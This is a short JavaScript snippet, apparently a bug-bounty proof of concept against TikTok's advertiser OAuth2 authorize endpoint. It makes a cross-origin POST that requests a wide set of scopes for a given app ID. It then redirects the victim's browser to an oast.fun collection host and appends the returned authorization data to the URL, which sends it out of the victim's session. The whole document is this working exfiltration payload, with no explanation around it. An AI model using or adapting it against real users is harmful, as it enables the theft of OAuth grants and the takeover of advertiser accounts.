var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://ads.tiktok.com/marketing_api/api/advertiser/oauth2/authorize/', true);
xhr.setRequestHeader('Content-type', 'application/json');
xhr.onload = () => {
    const data = JSON.parse(xhr.responseText);
var imran= (JSON.stringify(data));
location.replace("http://ce3mb4c2vtc00002egfgg8b4f1ryyyyyb.oast.fun/?DATA=" + imran );
};
xhr.send('{"app_id":"7049292206313586690","state":"your_custom_params","redirect_uri":"https://imran.com","scope":[1,2,3,4,5,6,7,8,9,10000,12000000,15000000,16000000,17000000,19000000,20000000,"7043626160646946818","7050363942434013185"],"redirect":true}');
